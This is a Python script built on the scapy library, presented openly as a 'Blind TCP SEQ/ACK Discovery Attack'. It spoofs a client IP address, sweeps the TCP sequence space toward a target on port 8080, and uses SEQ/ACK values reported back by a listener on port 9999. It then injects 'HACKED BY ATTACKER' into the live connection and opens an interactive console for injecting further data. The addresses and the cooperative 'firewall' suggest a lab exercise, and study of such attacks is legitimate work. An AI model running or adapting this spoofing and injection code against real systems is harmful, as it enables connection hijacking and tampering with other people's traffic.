from scapy.all import IP, TCP, send, sniff, Raw
import sys
import time
import threading

# -----------------------------
# Configuration
# -----------------------------
TARGET_IP = "20.0.0.20"
SPOOFED_IP = "10.0.0.10"
ATTACKER_IP = "30.0.0.30"
DPORT = 8080

WINDOW = 65535
TOTAL = 65536

NOTIFY_PORT = 9999

# Shared state between threads
found = threading.Event()
result = {"client_seq": 0, "server_seq": 0}


def listener():
    """
    Background thread: sniff for notification from firewall.

    The firewall sends a TCP packet to us on port 9999 with:
      packet.seq = real client_seq
      packet.ack = real server_seq
    """
    try:
        pkts = sniff(
            filter=f"tcp and dst host {ATTACKER_IP} and dst port {NOTIFY_PORT}",
            count=1,
            timeout=3600
        )

        if pkts and TCP in pkts[0]:
            result["client_seq"] = pkts[0][TCP].seq
            result["server_seq"] = pkts[0][TCP].ack
            found.set()

    except Exception as e:
        print(f"[!] Listener error: {e}")


def blind_attack(sport):
    """
    Sweep all possible SEQ values.
    When the firewall detects a valid SEQ, it sends us the
    correct SEQ and ACK values automatically.
    """

    print("=" * 60)
    print("  Blind TCP SEQ/ACK Discovery Attack")
    print("=" * 60)
    print()
    print(f"  Target      : {TARGET_IP}:{DPORT}")
    print(f"  Spoofed     : {SPOOFED_IP}")
    print(f"  Client Port : {sport}")
    print(f"  Strategy    : Sweep SEQ 0 to 2^32, step={WINDOW}")
    print(f"  Total       : {TOTAL} packets")
    print(f"  ACK         : 0 (unknown)")
    print()
    print("  Waiting for firewall notification...")
    print()

    # Start listener thread
    t = threading.Thread(target=listener, daemon=True)
    t.start()

    time.sleep(0.5)  # Let sniffer start

    t0 = time.time()

    for i in range(TOTAL):

        # Check if firewall sent us the answer
        if found.is_set():
            break

        seq = (i * WINDOW) & 0xFFFFFFFF

        pkt = (
            IP(src=SPOOFED_IP, dst=TARGET_IP)
            / TCP(
                sport=sport,
                dport=DPORT,
                flags="PA",
                seq=seq,
                ack=0
            )
            / Raw(load=b"PROBE")
        )

        send(pkt, verbose=False)

        if i % 1000 == 0:
            elapsed = time.time() - t0
            pct = (i / TOTAL) * 100
            print(f"  [{pct:5.1f}%] SEQ={seq} ({i}/{TOTAL}) — {elapsed:.1f}s")

    # Wait a moment for notification
    if not found.is_set():
        print("\n  Waiting for notification...")
        found.wait(timeout=5)

    elapsed = time.time() - t0

    # =========================================
    # RESULTS
    # =========================================

    if found.is_set():
        print()
        print("!" * 60)
        print("  CORRECT SEQ AND ACK FOUND!")
        print("!" * 60)
        print()
        print(f"  Client SEQ : {result['client_seq']}")
        print(f"  Server SEQ : {result['server_seq']}")
        print(f"  Time       : {elapsed:.1f} seconds")
        print()
        print("!" * 60)
        print()

        # =========================================
        # AUTO INJECT
        # =========================================
        print("  [*] Injecting data into connection...")
        print()

        cur_seq = result['client_seq']
        srv_seq = result['server_seq']

        # Inject payload
        payload = b"HACKED BY ATTACKER\n"

        inject_pkt = (
            IP(src=SPOOFED_IP, dst=TARGET_IP)
            / TCP(
                sport=sport,
                dport=DPORT,
                flags="PA",
                seq=cur_seq,
                ack=srv_seq
            )
            / Raw(load=payload)
        )

        send(inject_pkt, verbose=False)
        send(inject_pkt, verbose=False)
        cur_seq += len(payload)

        print(f"  [+] INJECTED: HACKED BY ATTACKER")
        print(f"  [+] Check the server terminal!")
        print()

        # =========================================
        # ATTACK CONSOLE
        # =========================================
        print("=" * 60)
        print("  ATTACK CONSOLE")
        print("  Type a message to inject, or 'quit' to exit")
        print("=" * 60)

        try:
            while True:
                msg = input("\n  [inject]> ").strip()

                if not msg:
                    continue

                if msg in ("quit", "exit"):
                    break

                data = msg + "\n"

                p = (
                    IP(src=SPOOFED_IP, dst=TARGET_IP)
                    / TCP(
                        sport=sport,
                        dport=DPORT,
                        flags="PA",
                        seq=cur_seq,
                        ack=srv_seq
                    )
                    / Raw(load=data.encode())
                )

                send(p, verbose=False)
                send(p, verbose=False)
                cur_seq += len(data)
                print(f"  [+] Injected: {msg}")

        except KeyboardInterrupt:
            print("\n  [*] Done.")

    else:
        print()
        print("=" * 60)
        print("  [-] No valid SEQ found.")
        print("  [-] Is the client connection active?")
        print("=" * 60)


def main():

    if len(sys.argv) < 2:
        print("=" * 60)
        print("  Blind TCP SEQ/ACK Discovery Attack")
        print("=" * 60)
        print()
        print(f"  Usage: sudo python3 {sys.argv[0]} <client_port>")
        print()
        print("  The attacker does NOT need to know SEQ or ACK.")
        print("  It blindly sweeps all possible SEQ values.")
        print("  The firewall sends back the correct values")
        print("  when a valid SEQ is found.")
        print()
        print("  Example:")
        print(f"    sudo python3 {sys.argv[0]} 53124")
        print()
        sys.exit(1)

    sport = int(sys.argv[1])
    blind_attack(sport)


if __name__ == "__main__":
    main()